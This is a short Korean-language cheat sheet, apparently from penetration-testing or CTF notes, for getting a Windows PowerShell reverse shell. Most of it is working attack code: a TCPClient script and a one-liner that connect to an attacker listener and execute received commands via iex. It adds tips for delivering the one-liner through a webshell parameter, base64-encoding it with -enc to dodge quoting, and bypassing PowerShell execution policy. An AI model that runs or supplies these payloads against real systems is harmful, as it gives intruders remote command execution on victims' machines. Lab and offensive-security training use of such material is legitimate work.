# windows powershell reverse shell

Windows 타깃에서 PowerShell이 돌아갈 때. Windows 셸은 TTY가 없어 안정화 단계는 없고, 공격자 리스너는 `rlwrap nc -lvnp 1234`로 띄운다.

## TCPClient 스크립트 (PowerShell 콘솔에서)

```powershell
$LHOST="10.10.10.10"; $LPORT=1234
$client = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
$sendback = (iex $data 2>&1 | Out-String )
$sendback2 = $sendback + "PS " + (pwd).Path + "> "
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
$stream.Write($sendbyte,0,$sendbyte.Length)
$stream.Flush()
}
$client.Close()
```

## 한 줄 버전 (cmd.exe·웹셸 cmd= 파라미터에서)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- `-nop` = 프로파일 미로드.

## 따옴표 충돌 우회 — base64 -enc

URL 파라미터·curl로 넘기면 따옴표가 깨진다. UTF-16LE로 인코딩해 `-enc`로 넘긴다.

```bash
iconv -f UTF-8 -t UTF-16LE powershell_payload.ps1 | base64 -w0
```

```powershell
powershell -nop -enc <base64 문자열>
```

## 기타

- ps1 파일을 cmd에서 실행: `powershell -ExecutionPolicy Bypass -File <경로>`
- 웹셸 cmd= 파라미터로 전송하는 스크립트: [scripts/send_powershell_reverse_shell_via_webshell.py](./scripts/send_powershell_reverse_shell_via_webshell.py)
- TCP outbound가 전부 막혔으면 [icmp_reverse_shell.md](./icmp_reverse_shell.md) (nishang)
